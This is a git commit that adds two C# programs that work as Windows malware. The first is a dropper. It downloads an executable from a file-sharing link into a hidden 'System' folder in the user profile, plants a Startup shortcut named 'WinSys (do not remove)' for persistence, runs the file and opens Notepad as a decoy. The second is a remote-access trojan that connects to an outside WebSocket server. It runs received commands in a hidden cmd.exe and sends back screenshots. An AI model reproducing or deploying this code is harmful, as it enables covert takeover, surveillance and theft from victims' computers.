c895a9e66a88f753ed1217606b5d3a3306ded7af
Antoine Raulin <25278917+antoineraulin@users.noreply.github.com>
2018-10-01 18:39:55 +0200

    First commit
    Co-Authored-By: Hypsie <hypsie@users.noreply.github.com>

---
+++ A2/A2/Program.cs
@@ -0,0 +1,56 @@
+﻿using IWshRuntimeLibrary;
+using System;
+using System.IO;
+using System.Net;
+
+namespace A2
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            string userprofileFolder = Environment.GetEnvironmentVariable("USERPROFILE");
+            System.Diagnostics.Debug.WriteLine(userprofileFolder);
+            string userStartupFolder = Environment.GetFolderPath(Environment.SpecialFolder.Startup);
+            System.Diagnostics.Debug.WriteLine(userStartupFolder);
+            string path = userprofileFolder+@"\System";
+            if (!Directory.Exists(path))
+            {
+                DirectoryInfo di = Directory.CreateDirectory(path);
+                di.Attributes = FileAttributes.Directory | FileAttributes.Hidden;
+            }
+            String filePath = userprofileFolder+@"\System\WinSys.exe";
+            if (!System.IO.File.Exists(filePath))
+            {
+                using (WebClient client = new WebClient())
+                {
+                    string s = client.DownloadString("https://anonfile.com/j1Eerfi5bf/A3_exe");
+                    System.Diagnostics.Debug.WriteLine(s);
+                    String St = s;
+
+                    int pFrom = St.IndexOf("<a type=\"button\" id=\"download-url\" class=\"btn btn-primary btn-block\" href=\"") + "<a type=\"button\" id=\"download-url\" class=\"btn btn-primary btn-block\" href=\"".Length;
+                    int pTo = St.IndexOf("\"><i");
+
+                    String result = St.Substring(pFrom, pTo - pFrom);
+                    System.Diagnostics.Debug.WriteLine(result);
+                    using (var clientt = new WebClient())
+                    {
+                        clientt.DownloadFile(result, filePath);
+                        System.IO.File.SetAttributes(filePath, FileAttributes.Hidden);
+
+                        string shortcutLocation = System.IO.Path.Combine(userStartupFolder, "WinSys" + ".lnk");
+                        WshShell shell = new WshShell();
+                        IWshShortcut shortcut = (IWshShortcut)shell.CreateShortcut(shortcutLocation);
+
+                        shortcut.Description = "WinSys (do not remove)";
+                        shortcut.TargetPath = filePath;                 
+                        shortcut.Save();
+                    }
+                }
+
+            }
+            System.Diagnostics.Process.Start(filePath);
+            System.Diagnostics.Process.Start("notepad.exe","mybeautifultexe.txt");
+        }
+    }
+}
---
+++ A3/A3/Program.cs
@@ -0,0 +1,77 @@
+﻿using System;
+using System.Diagnostics;
+using WebSocketSharp;
+using System.Threading;
+using System.Drawing;
+using System.IO;
+using System.Drawing.Imaging;
+using System.Windows.Forms;
+namespace A3
+{
+    class Program
+    {
+        static void Main(string[] args)
+        {
+            using (var ws = new WebSocket("ws://araulin.me:4422"))
+            {
+                ws.OnMessage += (sender, e) =>
+                {
+                    String message;
+                    message = e.Data;
+                    if (message == "screenshot")
+                    {
+                        ws.Send("Please wait, generating screenshot...");
+                        Bitmap memoryImage;
+                        memoryImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width,
+                        Screen.PrimaryScreen.Bounds.Height);
+                        Size s = new Size(memoryImage.Width, memoryImage.Height);
+                        Graphics memoryGraphics = Graphics.FromImage(memoryImage);
+                        memoryGraphics.CopyFromScreen(0, 0, 0, 0, s);
+                        
+                        MemoryStream stream = new MemoryStream();
+                        memoryImage.Save(stream, ImageFormat.Bmp);
+                        byte[] imageBytes = stream.ToArray();
+                        string base64String = Convert.ToBase64String(imageBytes);
+                        ws.Send("uploading screenshot (may exceed 10mo, please be patient)...");
+                        ws.Send("##SCREENSHOT##");
+                        ws.Send(base64String);
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }
+                    else
+                    {
+                        Process cmd = new Process();
+                        cmd.StartInfo.FileName = "cmd.exe";
+                        cmd.StartInfo.RedirectStandardInput = true;
+                        cmd.StartInfo.RedirectStandardOutput = true;
+                        cmd.StartInfo.CreateNoWindow = true;
+                        cmd.StartInfo.UseShellExecute = false;
+                        cmd.Start();
+
+                        cmd.StandardInput.WriteLine(message);
+                        cmd.StandardInput.Flush();
+                        cmd.StandardInput.Close();
+                        cmd.WaitForExit();
+                        ws.Send(cmd.StandardOutput.ReadToEnd());
+                        ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                    }
+                };
+                ws.OnClose += (sender, e) => {
+                    Stopwatch sw = new Stopwatch();
+                    sw.Start();
+                    while (true)
+                    {
+                        if(sw.ElapsedMilliseconds > 10000)
+                        {
+                            ws.Connect();
+                            ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                            break;
+                        }
+                    }
+                };
+                ws.Connect();
+                ws.Send("hello ##" + Environment.CurrentDirectory + "##");
+                new ManualResetEvent(false).WaitOne();
+            }
+        }
+    }
+}
